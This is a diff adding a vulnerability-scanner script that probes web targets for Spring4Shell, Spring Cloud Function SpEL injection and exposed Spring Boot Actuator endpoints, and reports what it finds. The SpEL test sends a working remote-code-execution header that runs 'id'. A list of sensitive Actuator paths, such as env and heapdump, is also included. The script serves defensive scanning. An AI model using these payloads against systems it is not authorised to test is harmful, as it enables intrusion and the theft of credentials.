@@ -1,0 +1,150 @@
+#include constants.inc;
+#include helpers.inc;
+
+var targetUrl = new TURL(scanURL.url);
+
+// CVE-2022-22965 - Spring4Shell RCE via ClassLoader manipulation
+// CVE-2022-22963 - Spring Cloud Function SpEL injection
+// Spring Boot Actuator endpoint exposure
+
+function testSpring4Shell() {
+    // Test 1: CVE-2022-22965 - ClassLoader data binding
+    var paths = ["/", "/login", "/api/", "/search"];
+
+    for (var i = 0; i < paths.length; i++) {
+        var job = new THTTPJob();
+        job.url = targetUrl;
+        job.URI = paths[i];
+        job.verb = "POST";
+        // ClassLoader probe - check if class.module.classLoader is accessible
+        job.postData = "class.module.classLoader.DefaultAssertionStatus=nonsense";
+        job.request.addHeader("Content-Type", "application/x-www-form-urlencoded");
+        job.execute();
+
+        if (!job.wasError && job.response.msg2 != 400) {
+            // Compare with a known-bad probe
+            var job2 = new THTTPJob();
+            job2.url = targetUrl;
+            job2.URI = paths[i];
+            job2.verb = "POST";
+            job2.postData = "class.module.classLoader.NONEXISTENT_PROPERTY_12345=test";
+            job2.request.addHeader("Content-Type", "application/x-www-form-urlencoded");
+            job2.execute();
+
+            if (!job2.wasError && job.response.msg2 != job2.response.msg2) {
+                var ri = new TReportItem();
+                ri.LoadFromFile("Application_Error.xml");
+                ri.affects = paths[i];
+                ri.alertPath = "Scripts/Spring4Shell";
+                ri.name = "Spring4Shell (CVE-2022-22965) - Potential RCE";
+                ri.severity = 4;
+                ri.setHttpInfo(job);
+                ri.details = "ClassLoader data binding appears accessible. " +
+                    "Different response status for valid vs invalid ClassLoader property." +
+                    "[break]Valid property response: " + job.response.msg2 +
+                    "[break]Invalid property response: " + job2.response.msg2;
+                AddReportItem(ri);
+            }
+        }
+    }
+}
+
+function testSpringCloudFunction() {
+    // CVE-2022-22963 - Spring Cloud Function SpEL RCE
+    var job = new THTTPJob();
+    job.url = targetUrl;
+    job.URI = "/functionRouter";
+    job.verb = "POST";
+    job.postData = "test";
+    job.request.addHeader("Content-Type", "text/plain");
+    job.request.addHeader("spring.cloud.function.routing-expression",
+        "T(java.lang.Runtime).getRuntime().exec('id')");
+    job.execute();
+
+    if (!job.wasError && job.response.msg2 == 500) {
+        var body = job.response.body;
+        if (body.indexOf("SpelEvaluation") != -1 ||
+            body.indexOf("routing-expression") != -1 ||
+            body.indexOf("functionRouter") != -1) {
+            var ri = new TReportItem();
+            ri.LoadFromFile("Application_Error.xml");
+            ri.affects = "/functionRouter";
+            ri.alertPath = "Scripts/Spring Cloud";
+            ri.name = "Spring Cloud Function SpEL Injection (CVE-2022-22963)";
+            ri.severity = 4;
+            ri.setHttpInfo(job);
+            ri.details = "Spring Cloud Function routing-expression header is processed. " +
+                "SpEL injection may lead to RCE.";
+            AddReportItem(ri);
+        }
+    }
+}
+
+function testSpringActuator() {
+    var actuatorPaths = [
+        "/actuator", "/actuator/env", "/actuator/health",
+        "/actuator/configprops", "/actuator/mappings",
+        "/actuator/beans", "/actuator/heapdump",
+        "/actuator/threaddump", "/actuator/loggers",
+        "/actuator/jolokia", "/actuator/gateway/routes",
+        "/manage/env", "/manage/health",
+        "/env", "/health", "/mappings", "/beans",
+    ];
+
+    var sensitiveEndpoints = [];
+
+    for (var i = 0; i < actuatorPaths.length; i++) {
+        var job = new THTTPJob();
+        job.url = targetUrl;
+        job.URI = actuatorPaths[i];
+        job.execute();
+
+        if (!job.wasError && job.response.msg2 == 200) {
+            var body = job.response.body;
+            var isSensitive = false;
+
+            if (actuatorPaths[i].indexOf("env") != -1 && body.indexOf("propert") != -1) {
+                isSensitive = true;
+            }
+            if (actuatorPaths[i].indexOf("heapdump") != -1) {
+                isSensitive = true;
+            }
+            if (actuatorPaths[i].indexOf("configprops") != -1 && body.indexOf("prefix") != -1) {
+                isSensitive = true;
+            }
+            if (actuatorPaths[i].indexOf("mappings") != -1 && body.indexOf("handler") != -1) {
+                isSensitive = true;
+            }
+            if (actuatorPaths[i].indexOf("jolokia") != -1) {
+                isSensitive = true;
+            }
+            if (actuatorPaths[i].indexOf("gateway") != -1 && body.indexOf("route_id") != -1) {
+                isSensitive = true;
+            }
+
+            if (isSensitive) {
+                sensitiveEndpoints.push(actuatorPaths[i]);
+            }
+        }
+    }
+
+    if (sensitiveEndpoints.length > 0) {
+        var ri = new TReportItem();
+        ri.LoadFromFile("Application_Error.xml");
+        ri.affects = sensitiveEndpoints[0];
+        ri.alertPath = "Scripts/Spring Actuator";
+        ri.name = "Spring Boot Actuator - Sensitive Endpoints Exposed";
+        ri.severity = 3;
+        ri.details = "Exposed Spring Boot Actuator endpoints:[break]" +
+            sensitiveEndpoints.join("[break]") +
+            "[break][break]These endpoints may leak configuration, credentials, and internal mappings. " +
+            "/actuator/env can expose database passwords and API keys. " +
+            "/actuator/heapdump can leak in-memory secrets. " +
+            "/actuator/gateway/routes may allow SSRF via route injection.";
+        AddReportItem(ri);
+    }
+}
+
+testSpring4Shell();
+testSpringCloudFunction();
+testSpringActuator();
